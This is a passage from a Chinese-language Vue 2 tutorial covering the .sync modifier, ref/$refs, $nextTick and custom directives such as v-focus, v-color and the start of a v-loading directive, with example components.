class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;base-dialog-wrap&quot; v-show=&quot;isShow&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;base-dialog&quot;&gt;</span><br><span class="line">      &lt;div class=&quot;title&quot;&gt;</span><br><span class="line">        &lt;h3&gt;温馨提示：&lt;/h3&gt;</span><br><span class="line">        &lt;button class=&quot;close&quot; @click=&quot;closeDialog&quot;&gt;x&lt;/button&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">      &lt;div class=&quot;content&quot;&gt;</span><br><span class="line">        &lt;p&gt;你确认要退出本系统么？&lt;/p&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">      &lt;div class=&quot;footer&quot;&gt;</span><br><span class="line">        &lt;button&gt;确认&lt;/button&gt;</span><br><span class="line">        &lt;button&gt;取消&lt;/button&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">  props: &#123;</span><br><span class="line">    isShow: Boolean,</span><br><span class="line">  &#125;,</span><br><span class="line">  methods:&#123;</span><br><span class="line">    closeDialog()&#123;</span><br><span class="line">      this.$emit(&#x27;update:isShow&#x27;,false)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line">.base-dialog-wrap &#123;</span><br><span class="line">  width: 300px;</span><br><span class="line">  height: 200px;</span><br><span class="line">  box-shadow: 2px 2px 2px 2px #ccc;</span><br><span class="line">  position: fixed;</span><br><span class="line">  left: 50%;</span><br><span class="line">  top: 50%;</span><br><span class="line">  transform: translate(-50%, -50%);</span><br><span class="line">  padding: 0 10px;</span><br><span class="line">&#125;</span><br><span class="line">.base-dialog .title &#123;</span><br><span class="line">  display: flex;</span><br><span class="line">  justify-content: space-between;</span><br><span class="line">  align-items: center;</span><br><span class="line">  border-bottom: 2px solid #000;</span><br><span class="line">&#125;</span><br><span class="line">.base-dialog .content &#123;</span><br><span class="line">  margin-top: 38px;</span><br><span class="line">&#125;</span><br><span class="line">.base-dialog .title .close &#123;</span><br><span class="line">  width: 20px;</span><br><span class="line">  height: 20px;</span><br><span class="line">  cursor: pointer;</span><br><span class="line">  line-height: 10px;</span><br><span class="line">&#125;</span><br><span class="line">.footer &#123;</span><br><span class="line">  display: flex;</span><br><span class="line">  justify-content: flex-end;</span><br><span class="line">  margin-top: 26px;</span><br><span class="line">&#125;</span><br><span class="line">.footer button &#123;</span><br><span class="line">  width: 80px;</span><br><span class="line">  height: 40px;</span><br><span class="line">&#125;</span><br><span class="line">.footer button:nth-child(1) &#123;</span><br><span class="line">  margin-right: 10px;</span><br><span class="line">  cursor: pointer;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>1.父组件如果想让子组件修改传过去的值 必须加什么修饰符？</p><p><code>    &lt;BaseDialog :isShow.sync=&quot;isShow&quot;&gt;&lt;/BaseDialog&gt;</code></p><p>2.子组件要修改父组件的props值 必须使用什么语法？</p><p><code>this.$emit(&#39;update:isShow&#39;,false)</code></p><h1 id="ref和-refs"><a href="#ref和-refs" class="headerlink" title="ref和$refs"></a>ref和$refs</h1><h2 id="作用-1"><a href="#作用-1" class="headerlink" title="作用"></a>作用</h2><p>利用ref 和 $refs 可以用于 获取 dom 元素 或 组件实例</p><h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2><p>查找范围 →  当前组件内(更精确稳定)</p><h2 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h2><p>1.给要获取的盒子添加ref属性</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">ref</span>=<span class="string">&quot;chartRef&quot;</span>&gt;</span>我是渲染图表的容器<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>2.获取时通过 $refs获取  this.$refs.chartRef 获取</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mounted () &#123;</span><br><span class="line">  console.log(this.$refs.chartRef)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>之前只用document.querySelect(‘.box’) 获取的是整个页面中的盒子</p><h2 id="代码示例-1"><a href="#代码示例-1" class="headerlink" title="代码示例"></a>代码示例</h2><p>App.vue</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;app&quot;&gt;</span><br><span class="line">    &lt;BaseChart&gt;&lt;/BaseChart&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">import BaseChart from &#x27;./components/BaseChart.vue&#x27;</span><br><span class="line">export default &#123;</span><br><span class="line">  components:&#123;</span><br><span class="line">    BaseChart</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style&gt;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><h3 id="获取dom元素"><a href="#获取dom元素" class="headerlink" title="获取dom元素"></a>获取dom元素</h3><p>BaseChart.vue</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;base-chart-box&quot; ref=&quot;baseChartBox&quot;&gt;子组件&lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">// yarn add echarts 或者 npm i echarts</span><br><span class="line">import * as echarts from &#x27;echarts&#x27;</span><br><span class="line"></span><br><span class="line">export default &#123;</span><br><span class="line">  mounted() &#123;</span><br><span class="line">    // 基于准备好的dom，初始化echarts实例</span><br><span class="line">    var myChart = echarts.init(document.querySelect(&#x27;.base-chart-box&#x27;))</span><br><span class="line">    // 绘制图表</span><br><span class="line">    myChart.setOption(&#123;</span><br><span class="line">      title: &#123;</span><br><span class="line">        text: &#x27;ECharts 入门示例&#x27;,</span><br><span class="line">      &#125;,</span><br><span class="line">      tooltip: &#123;&#125;,</span><br><span class="line">      xAxis: &#123;</span><br><span class="line">        data: [&#x27;衬衫&#x27;, &#x27;羊毛衫&#x27;, &#x27;雪纺衫&#x27;, &#x27;裤子&#x27;, &#x27;高跟鞋&#x27;, &#x27;袜子&#x27;],</span><br><span class="line">      &#125;,</span><br><span class="line">      yAxis: &#123;&#125;,</span><br><span class="line">      series: [</span><br><span class="line">        &#123;</span><br><span class="line">          name: &#x27;销量&#x27;,</span><br><span class="line">          type: &#x27;bar&#x27;,</span><br><span class="line">          data: [5, 20, 36, 10, 10, 20],</span><br><span class="line">        &#125;,</span><br><span class="line">      ],</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line">.base-chart-box &#123;</span><br><span class="line">  width: 400px;</span><br><span class="line">  height: 300px;</span><br><span class="line">  border: 3px solid #000;</span><br><span class="line">  border-radius: 6px;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><h3 id="获取组件实例"><a href="#获取组件实例" class="headerlink" title="获取组件实例"></a>获取组件实例</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">v-if</span>=<span class="string">&quot;isShowEdit&quot;</span>&gt;</span></span><br><span class="line">      //通过ref=&quot;&quot;的方式对组件进行标识</span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;editValue&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;inp&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">button</span>&gt;</span>确认<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">v-else</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">span</span>&gt;</span>&#123;&#123; title &#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;editFn&quot;</span>&gt;</span>编辑<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">data</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">title</span>: <span class="string">&#x27;大标题&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">isShowEdit</span>: <span class="literal">false</span>,</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">editValue</span>: <span class="string">&#x27;&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">editFn</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// 1.显示文本框</span></span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">this</span>.<span class="property">isShowEdit</span> = <span class="literal">true</span></span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// 2.让文本框聚焦 （会等dom更新完之后 立马执行nextTick中的回调函数）</span></span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// this.$nextTick(() =&gt; &#123;</span></span></span><br><span class="line"><span class="language-javascript">      <span class="comment">//   console.log(this.$refs.inp)</span></span></span><br><span class="line"><span class="language-javascript">      <span class="comment">//   this.$refs.inp.focus()</span></span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// &#125;)</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//通过this.$refs.inf调用组件实例。</span></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">this</span>.<span class="property">$refs</span>.<span class="property">inp</span>.<span class="title function_">focus</span>()</span></span><br><span class="line"><span class="language-javascript">      &#125;, <span class="number">0</span>)</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="异步更新-nextTick"><a href="#异步更新-nextTick" class="headerlink" title="异步更新 &amp; $nextTick"></a>异步更新 &amp; $nextTick</h1><h2 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h2><p>编辑标题,  编辑框自动聚焦</p><ol><li>点击编辑，显示编辑框</li><li>让编辑框，立刻获取焦点</li></ol><p><img src="/2023/12/28/Vue/1682394495346.png" alt="68239449534"></p><h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;app&quot;&gt;</span><br><span class="line">    &lt;div v-if=&quot;isShowEdit&quot;&gt;</span><br><span class="line">      &lt;input type=&quot;text&quot; v-model=&quot;editValue&quot; ref=&quot;inp&quot; /&gt;</span><br><span class="line">      &lt;button&gt;确认&lt;/button&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;div v-else&gt;</span><br><span class="line">      &lt;span&gt;&#123;&#123; title &#125;&#125;&lt;/span&gt;</span><br><span class="line">      &lt;button @click=&quot;editFn&quot;&gt;编辑&lt;/button&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">  data() &#123;</span><br><span class="line">    return &#123;</span><br><span class="line">      title: &#x27;大标题&#x27;,</span><br><span class="line">      isShowEdit: false,</span><br><span class="line">      editValue: &#x27;&#x27;,</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  methods: &#123;</span><br><span class="line">    editFn() &#123;</span><br><span class="line">        // 显示输入框</span><br><span class="line">        this.isShowEdit = true  </span><br><span class="line">        // 获取焦点</span><br><span class="line">        this.$refs.inp.focus() </span><br><span class="line">    &#125;  &#125;,</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt; </span><br></pre></td></tr></table></figure><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>“显示之后”，立刻获取焦点是不能成功的！</p><p>原因：Vue 是异步更新DOM  (提升性能)</p><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>$nextTick：<strong>等 DOM更新后</strong>,才会触发执行此方法里的函数体</p><p><strong>语法:</strong> this.$nextTick(函数体)</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">this</span>.$nextTick(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">$refs</span>.<span class="property">inp</span>.<span class="title function_">focus</span>()</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><strong>注意：</strong>$nextTick 内的函数体 一定是<strong>箭头函数</strong>，这样才能让函数内部的this指向Vue实例</p><h1 id="自定义指令"><a href="#自定义指令" class="headerlink" title="自定义指令"></a>自定义指令</h1><h2 id="指令介绍"><a href="#指令介绍" class="headerlink" title="指令介绍"></a>指令介绍</h2><ul><li><p>内置指令：<strong>v-html、v-if、v-bind、v-on</strong>… 这都是Vue给咱们内置的一些指令，可以直接使用</p></li><li><p>自定义指令：同时Vue也支持让开发者，自己注册一些指令。这些指令被称为<strong>自定义指令</strong></p><p>每个指令都有自己各自独立的功能</p></li></ul><h2 id="自定义指令-1"><a href="#自定义指令-1" class="headerlink" title="自定义指令"></a>自定义指令</h2><p>概念：自己定义的指令，可以<strong>封装一些DOM操作</strong>，扩展额外的功能</p><h2 id="自定义指令语法"><a href="#自定义指令语法" class="headerlink" title="自定义指令语法"></a>自定义指令语法</h2><ul><li><p>全局注册</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//在main.js中</span></span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">directive</span>(<span class="string">&#x27;指令名&#x27;</span>, &#123;</span><br><span class="line">  <span class="string">&quot;inserted&quot;</span> (el) &#123;</span><br><span class="line">    <span class="comment">// 可以对 el 标签，扩展额外功能</span></span><br><span class="line">    el.<span class="title function_">focus</span>()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li><li><p>局部注册</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">export default &#123;</span><br><span class="line">  // mounted () &#123;</span><br><span class="line">  //   this.$refs.inp.focus()</span><br><span class="line">  // &#125;</span><br><span class="line">  </span><br><span class="line">  // 2. 局部注册指令</span><br><span class="line">  directives: &#123;</span><br><span class="line">    // 指令名：指令的配置项</span><br><span class="line">    focus: &#123;</span><br><span class="line">      inserted (el) &#123;</span><br><span class="line">        el.focus()</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>使用指令</p><p>注意：在使用指令的时候，一定要<strong>先注册</strong>，<strong>再使用</strong>，否则会报错<br>使用指令语法： v-指令名。如：<code>&lt;input type=&quot;text&quot;  v-focus/&gt;</code>  </p><p><strong>注册</strong>指令时<strong>不用</strong>加<strong>v-前缀</strong>，但<strong>使用时</strong>一定要<strong>加v-前缀</strong></p></li></ul><h2 id="指令中的配置项介绍"><a href="#指令中的配置项介绍" class="headerlink" title="指令中的配置项介绍"></a>指令中的配置项介绍</h2><p>inserted:被绑定元素插入父节点时调用的钩子函数</p><p>el：使用指令的那个DOM元素</p><h2 id="代码示例-2"><a href="#代码示例-2" class="headerlink" title="代码示例"></a>代码示例</h2><p>需求：当页面加载时，让元素获取焦点（<strong>autofocus在safari浏览器有兼容性</strong>）</p><p>App.vue</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;div&gt;</span><br><span class="line">  &lt;h1&gt;自定义指令&lt;/h1&gt;</span><br><span class="line">  &lt;input v-focus ref=&quot;inp&quot; type=&quot;text&quot;&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><p>1.自定义指令的作用是什么？</p><p>封装DOM操作，扩展额外的功能；</p><p>2.使用自定义指令的步骤是哪两步？</p><p>第一步，通过全局(main.js)、局部(组件的vue)进行自定义指令的注册；第二步，通过v-xxx指令在DOM中进行使用。</p><h2 id="自定义指令-指令的值"><a href="#自定义指令-指令的值" class="headerlink" title="自定义指令 - 指令的值"></a>自定义指令 - 指令的值</h2><h2 id="需求-1"><a href="#需求-1" class="headerlink" title="需求"></a>需求</h2><p>实现一个 color 指令 - 传入不同的颜色, 给标签设置文字颜色</p><h2 id="语法-2"><a href="#语法-2" class="headerlink" title="语法"></a>语法</h2><p>1.在绑定指令时，可以通过“等号”的形式为指令 绑定 具体的参数值</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">v-color</span>=<span class="string">&quot;color&quot;</span>&gt;</span>我是内容<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>2.通过 <code>binding.value</code> 可以拿到指令值，<strong>指令值修改会 触发 update 函数</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">directives</span>: &#123;</span><br><span class="line">  <span class="attr">color</span>: &#123;</span><br><span class="line">    inserted (el, binding) &#123;</span><br><span class="line">      el.<span class="property">style</span>.<span class="property">color</span> = binding.<span class="property">value</span></span><br><span class="line">    &#125;,</span><br><span class="line">    update (el, binding) &#123;</span><br><span class="line">      el.<span class="property">style</span>.<span class="property">color</span> = binding.<span class="property">value</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="代码示例-3"><a href="#代码示例-3" class="headerlink" title="代码示例"></a>代码示例</h2><p>App.vue</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;h1 v-color=&quot;color1&quot;&gt;指令的值1测试&lt;/h1&gt;</span><br><span class="line">    &lt;h1 v-color=&quot;color2&quot;&gt;指令的值2测试&lt;/h1&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">  data () &#123;</span><br><span class="line">    return &#123;</span><br><span class="line">      color1: &#x27;red&#x27;,</span><br><span class="line">      color2: &#x27;orange&#x27;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  directives: &#123;</span><br><span class="line">    color: &#123;</span><br><span class="line">      // 1. inserted 提供的是元素被添加到页面中时的逻辑</span><br><span class="line">      inserted (el, binding) &#123;</span><br><span class="line">        // console.log(el, binding.value);</span><br><span class="line">        // binding.value 就是指令的值</span><br><span class="line">        el.style.color = binding.value</span><br><span class="line">      &#125;,</span><br><span class="line">      // 2. update 指令的值修改的时候触发，提供值变化后，dom更新的逻辑</span><br><span class="line">      update (el, binding) &#123;</span><br><span class="line">        console.log(&#x27;指令的值修改了&#x27;);</span><br><span class="line">        el.style.color = binding.value</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style&gt;</span><br><span class="line"></span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><h1 id="自定义指令-v-loading指令的封装"><a href="#自定义指令-v-loading指令的封装" class="headerlink" title="自定义指令-v-loading指令的封装"></a>自定义指令-v-loading指令的封装</h1><h2 id="场景-1"><a href="#场景-1" class="headerlink" title="场景"></a>场景</h2><p>实际开发过程中，发送请求需要时间，在请求的数据未回来时，页面会处于<strong>空白状态</strong>  &#x3D;&gt;  用户体验不好</p><h2 id="需求-2"><a href="#需求-2" class="headerlink" title="需求"></a>需求</h2><p>封装一个 v-loading 指令，实现加载中的效果</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>1.本质 loading效果就是一个蒙层，盖在了盒子上</p><p>2.数据请求中，开启loading状态，添加蒙层</p><p>3.数据请求完毕，关闭loading状态，移除蒙层</p><h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p>1.准备一个 loading类，通过伪元素定位，设置宽高，实现蒙层</p><p>2.开启关闭 loading状态（添加移除蒙层），本质只需要添加移除类即可</p><p>3.结合自定义指令的语法进行封装复用</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.loading</span><span class="selector-pseudo">:before</span> &#123;</span><br><span class="line">  <span class="attribute">content</span>: <span class="string">&quot;&quot;</span>;</span><br><span class="line">  <span class="attribute">position</span>: absolute;</span><br><span class="line">  <span class="attribute">left</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">top</span>: <span class="number">0</span>;</span><br><span 